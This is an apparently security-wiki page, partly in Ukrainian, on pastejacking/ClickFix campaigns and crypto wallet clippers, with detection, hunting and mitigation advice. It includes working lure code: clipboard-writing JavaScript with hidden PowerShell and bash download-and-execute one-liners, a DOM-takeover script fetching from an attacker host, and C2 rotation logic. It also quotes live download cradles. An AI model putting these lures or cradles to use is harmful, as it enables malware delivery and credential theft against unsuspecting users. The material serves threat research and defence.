# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – стара, але досі актуальна порада

## Overview

Clipboard hijacking – також відомий як *pastejacking* – зловживає тим, що користувачі регулярно copy-and-paste команди без їх перевірки. Шкідлива web page (або будь-який контекст із підтримкою JavaScript, такий як Electron або Desktop application) програмно поміщає текст, контрольований attacker, у системний clipboard. Жертв зазвичай заохочують, як правило, за допомогою ретельно продуманих social-engineering інструкцій, натиснути **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), або відкрити terminal і *paste* вміст clipboard, негайно виконуючи arbitrary commands.

Оскільки **жоден file не завантажується і жоден attachment не відкривається**, ця technique обходить більшість e-mail і web-content security controls, які відстежують attachments, macros або direct command execution. Тому атака популярна в phishing campaigns, що доставляють commodity malware families, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.

## Wallet-address replacement clippers

Інший варіант **clipboard hijacking** взагалі не вставляє commands: він чекає, доки victim скопіює **cryptocurrency wallet address**, а потім непомітно підміняє її на адресу, контрольовану attacker, безпосередньо перед paste. Це особливо ефективно проти довгих wallet formats, тому що користувачі часто перевіряють лише перші/останні символи.

Поширені реальні ознаки:
- **Thin loader + nested payload**: видимий app/exe виглядає як легітимний trading або "profit" tool, тоді як справжній clipper схований глибше в bundle (наприклад, .NET loader запускає вкладений Rust payload).
- **Regex-driven replacement**: malware зіставляє рядки на кшталт `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, або навіть загальні **44-character Solana-like** рядки і переписує їх на attacker wallets.
- **Wallet rotation at scale**: сучасні samples для Windows можуть вбудовувати **тисячі** replacement wallets для кожної currency замість однієї статичної адреси, зменшуючи reputation burn wallet після кожної крадіжки.

### Windows clipper flow

Поширена реалізація — це приховане window, зареєстроване через **`AddClipboardFormatListener`**. Після кожного оновлення clipboard malware зазвичай викликає:
- **`OpenClipboard`** → доступ до поточних даних clipboard.
- **`GetClipboardData`** → читання text.
- **`EmptyClipboard`** + **`SetClipboardData`** → заміна wallet string на значення attacker.

Minimal hunting regexes, які часто зустрічаються у clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Достатньо user-level persistence для impact. Один із спостережуваних патернів:
- Copy payload to **`%APPDATA%\silke\silke.exe`**
- Create a **Startup-folder LNK** under `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Detection ideas:
- Processes that call clipboard APIs continuously while also writing under `%APPDATA%` and the user **Startup** folder.
- New LNK/executable creation followed by wallet-address clipboard rewrites.
- Archives or fake-software bundles containing many unused files plus a small launcher that starts a nested binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

On macOS, some campaigns ship an **`unlocker.command`** helper and instruct the victim to right-click → **Open** if Gatekeeper says the app is damaged or from an unidentified developer. The script simply removes quarantine and launches the nearby `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Старі кампанії використовували `document.execCommand('copy')`, новіші покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Користувач відвідує typosquatted або compromised site (наприклад `docusign.sa[.]com`)
2. Впроваджений **ClearFake** JavaScript викликає helper `unsecuredCopyToClipboard()`, який непомітно зберігає Base64-кодований PowerShell one-liner у clipboard.
3. HTML instructions кажуть жертві: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` виконується, завантажуючи archive, який містить legitimate executable plus malicious DLL (classic DLL sideloading).
5. loader decrypts additional stages, injects shellcode and installs persistence (наприклад scheduled task) – врешті-решт запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) шукає у своєму каталозі `msvcp140.dll`.
* Шкідлива DLL динамічно резолвить APIs за допомогою **GetProcAddress**, завантажує два binaries (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх, використовуючи rolling XOR key `"https://google.com/"`, інжектить final shellcode і розпаковує **client32.exe** (NetSupport RAT) до `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript downloader всередині **cscript.exe**
3. Отримує MSI payload → скидає `libcef.dll` поруч із підписаною application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** виклик запускає прихований PowerShell script, який отримує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відновлює `AutoIt3.exe` через `extrac32` та конкатенацію файлів і, нарешті, запускає `.a3x` script, який exfiltrates browser credentials до `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Деякі кампанії ClickFix повністю пропускають завантаження файлів і змушують жертв вставити one-liner, який отримує та виконує JavaScript через WSH, закріплюється та щодня ротує C2. Приклад ланцюга, який спостерігався:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові ознаки
- Обфускований URL перевертається під час виконання, щоб ускладнити поверхневий огляд.
- JavaScript самозберігається через Startup LNK (WScript/CScript) і вибирає C2 за поточним днем — це дає змогу швидко ротувати домени.

Мінімальний фрагмент JS, який використовується для ротації C2 за датою:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який забезпечує persistence і завантажує RAT (наприклад, PureHVNC), часто pinning TLS до жорстко захардкоженого certificate і chunking traffic.

Ідеї для detection, специфічні для цієї варіації
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (або `cscript.exe`).
- Startup artifacts: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, який викликає WScript/CScript із JS path під `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU і command-line telemetry, що містять `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторні `powershell -NoProfile -NonInteractive -Command -` із великими stdin payloads для передавання довгих script без довгих command lines.
- Scheduled Tasks, які згодом виконують LOLBins, такі як `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` під task/path, що виглядає як updater (наприклад, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Щодня ротовані C2 hostname і URLs із шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Кореляція clipboard write events, за якими слідує paste через Win+R, а потім негайне виконання `powershell.exe`.


Blue-teams можуть поєднувати clipboard, process-creation і registry telemetry, щоб точно визначати abuse пастежекінгу:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію команд **Win + R** – шукайте незвичні Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation), де `ParentImage` == `explorer.exe`, а `NewProcessName` у { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створення файлів під `%LocalAppData%\Microsoft\Windows\WinX\` або в temporary folders безпосередньо перед підозрілим подією 4688.
* EDR clipboard sensors (якщо є) – корелюйте `Clipboard Write`, після якого одразу з’являється новий PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Останні кампанії масово створюють fake CDN/browser verification pages ("Just a moment…", IUAM-style), які примушують користувачів копіювати OS-specific commands із clipboard у native consoles. Це виводить виконання за межі browser sandbox і працює як на Windows, так і на macOS.

Ключові ознаки builder-generated pages
- OS detection через `navigator.userAgent` для підлаштування payloads (Windows PowerShell/CMD vs. macOS Terminal). Опційні decoys/no-ops для unsupported OS, щоб зберегти ілюзію.
- Automatic clipboard-copy під час безпечних UI actions (checkbox/Copy), тоді як видимий текст може відрізнятися від clipboard content.
- Блокування mobile та popover із покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → відкрити Terminal→paste→Enter.
- Опційна obfuscation і single-file injector для перезапису DOM скомпрометованого site на verification UI у стилі Tailwind (без потреби в новій domain registration).

Приклад: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` so execution continues after the terminal closes, reducing visible artifacts.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Виявлення та ідеї hunting, специфічні для IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; невідповідність між відображуваним текстом і clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace у підозрілих контекстах.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` невдовзі після взаємодії з browser; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

Див. також supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake continues to compromise WordPress sites and inject loader JavaScript that chains external hosts (Cloudflare Workers, GitHub/jsDelivr) and even blockchain “etherhiding” calls (e.g., POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`) to pull current lure logic. Recent overlays heavily use fake CAPTCHAs that instruct users to copy/paste a one-liner (T1204.004) instead of downloading anything.
- Initial execution is increasingly delegated to signed script hosts/LOLBAS. January 2026 chains swapped earlier `mshta` usage for the built-in `SyncAppvPublishingServer.vbs` executed via `WScript.exe`, passing PowerShell-like arguments with aliases/wildcards to fetch remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` підписаний і зазвичай використовується by App-V; у парі з `WScript.exe` та незвичними аргументами (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) він стає high-signal LOLBAS stage для ClearFake.
- У лютому 2026 fake CAPTCHA payloads знову змістилися до чистих PowerShell download cradles. Два live examples:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- First chain is an in-memory `iex(irm ...)` grabber; the second stages via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden window.

Поради для detection/hunting цих варіантів
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` або PowerShell cradles одразу після clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, домени jsDelivr/GitHub/Cloudflare Worker, або raw IP `iex(irm ...)` patterns.
- Network: outbound до CDN worker hosts або blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: тимчасове створення `.ps1` під `%TEMP%` плюс RunMRU entries, що містять ці one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) або require user gesture.
2. Security awareness – навчати users *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** часто abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
